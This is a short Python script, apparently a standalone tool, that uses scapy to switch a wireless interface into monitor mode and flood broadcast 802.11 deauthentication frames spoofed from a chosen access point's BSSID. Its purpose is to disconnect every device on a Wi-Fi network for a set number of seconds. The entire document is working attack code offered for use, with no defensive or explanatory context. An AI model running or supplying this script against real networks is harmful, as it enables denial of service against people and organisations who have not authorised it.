from scapy.all import *
import argparse, os

parser = argparse.ArgumentParser(description="Deauthenticate temporarily all devices connected to a WI-FI network (IEEE 802.11w)")
parser.add_argument("BSSID", help="MAC address of the wireless access point",type=str)
parser.add_argument("-s","--seconds", help="disconnection time in seconds from the network. (default: 10)", nargs="?", const=10, default=10, type=int)
parser.add_argument("-i","--interface", help="Wireless interface. (default: wlan0)", nargs="?", const="wlan0", default="wlan0", type=str)
args = parser.parse_args()

MAC_BROADCAST:str = "ff:ff:ff:ff:ff:ff"

def switch_interface(mon=True)->None:
    os.system(f"ifconfig {args.interface} down")
    os.system(f"iwconfig {args.interface} mode {'monitor'if mon else'managed'}")
    os.system(f"ifconfig {args.interface} up")

try:
    switch_interface()
    deauth = Dot11(addr1=MAC_BROADCAST,addr2=args.BSSID,addr3=args.BSSID)
    pkt = RadioTap()/deauth/Dot11Deauth(reason=7)
    sendp(pkt, inter=0.1, count=args.seconds*10, iface=args.interface, verbose=1)
    switch_interface(False)
except Exception as e:
    print(f"Error: {e}")
